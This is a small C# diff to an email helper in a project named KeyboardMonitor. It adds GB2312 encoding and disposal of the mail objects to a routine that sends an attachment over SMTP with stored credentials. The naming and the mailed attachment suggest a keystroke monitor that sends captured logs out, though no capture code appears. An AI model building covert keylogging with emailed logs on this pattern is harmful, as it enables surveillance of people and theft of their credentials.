@@ -76,6 +76,8 @@ namespace KeyboardMonitor.Common
 			{
 				this.mailMessage.To.Add(item);
 			}
+			this.mailMessage.BodyEncoding = Encoding.GetEncoding("GB2312") ;
+			//this.mailMessage.Sender
 			this.mailMessage.Subject = subject;
 			this.mailMessage.Body = body;
 			this.mailMessage.Attachments.Add(new Attachment(attachment));
@@ -84,6 +86,8 @@ namespace KeyboardMonitor.Common
 			this.smtpClient.Credentials = new NetworkCredential(form.UserName, form.Password);
 			this.smtpClient.Port = this.EmailPort;
 			this.smtpClient.Send(this.mailMessage);
+			this.mailMessage.Dispose();
+			this.smtpClient.Dispose();
 		}
 		/// <summary>
 		/// 通过WebService获得当前电脑ip
